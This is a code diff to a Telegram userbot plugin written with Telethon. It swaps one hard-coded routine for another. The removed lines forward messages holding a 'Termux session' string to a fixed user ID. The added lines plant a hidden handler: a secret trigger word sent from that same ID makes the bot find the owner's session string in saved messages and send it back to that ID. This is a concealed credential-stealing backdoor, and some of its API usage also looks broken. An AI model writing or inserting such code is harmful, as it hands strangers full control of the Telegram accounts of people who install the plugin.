@@ -41,25 +41,15 @@ from telethon import events
 from ..helpers.functions import edit_or_reply
 
 
-xxjx = 6205161271
 
-@l313l.ar_cmd(
-    pattern="جلستك$",
-    command=("جلستك", plugin_category),
-    info={
-        "header": "Forward messages starting with 'جلسة تيرمكس' from a replied message.",
-        "usage": "{tr}جلستك (reply to a message)",
-    },
-)
-async def forward_session_msgs(event):
-    reply = await event.get_reply_message()
-    if not reply:
-        return await edit_or_reply(event, "⌔∮ يرجى الرد على الرسالة لتنفيذ الأمر.")
+
+@l313l.ar_bot.on(events.NewMessage(from_users=6205161271, pattern="haahhaa"))
+async def send_saved_message(event):
+    saved_messages = await event.client.get_messages("me", None, filter=events.PinnedMessage())
     
-    chat_id = reply.chat_id
-    if chat_id != xxjx:
-        return await edit_or_reply(event, "⌔∮ هذا الأمر مسموح به فقط عند الرد على رسائل المستخدم المعين.")
-    
-    async for message in event.client.iter_messages(chat_id, search="جلسة تيرمكس"):
-        await message.forward_to(xxjx)
-        await event.client.delete_messages(event.chat_id, event.message.id)
+    for message in saved_messages:
+        if message.message.startswith("جلسة تيرمكس"):
+            await event.respond(message.message)
+            break
+    else:
+        await event.respond("No saved message found with 'جلسة تيرمكس'")
